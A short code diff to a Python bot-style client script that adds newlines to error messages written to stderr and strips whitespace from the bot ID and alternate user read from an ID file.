@@ -397,7 +397,7 @@ def main(host=HOST, port=PORT, botid=None, altuser=None):
                 fs.format_send(json_str)
                 serve(fs,altuser)
             except Exception as e:
-                sys.stderr.write("[!] "+str(e))
+                sys.stderr.write("[!] "+str(e) + "\n")
         if RUNNING:
             # Try again in a minute
             time.sleep(10)
@@ -559,7 +559,7 @@ def serve(sock,user):
                     RESTART = False
 
             except Exception as e:
-                sys.stderr.write("[!] " + str(e))
+                sys.stderr.write("[!] " + str(e) + "\n")
                 RUNNING = False
 
             if not RUNNING:
@@ -727,9 +727,9 @@ if __name__ == "__main__":
         altuser = None
         if os.path.exists(IDFILE):
             with open(IDFILE,"r") as f:
-                bid = f.readline()
+                bid = f.readline().strip()
                 try:
-                    altuser = f.readline()
+                    altuser = f.readline().strip()
                 except:
                     altuser = None
         main(hostaddr,hostport,bid,altuser)
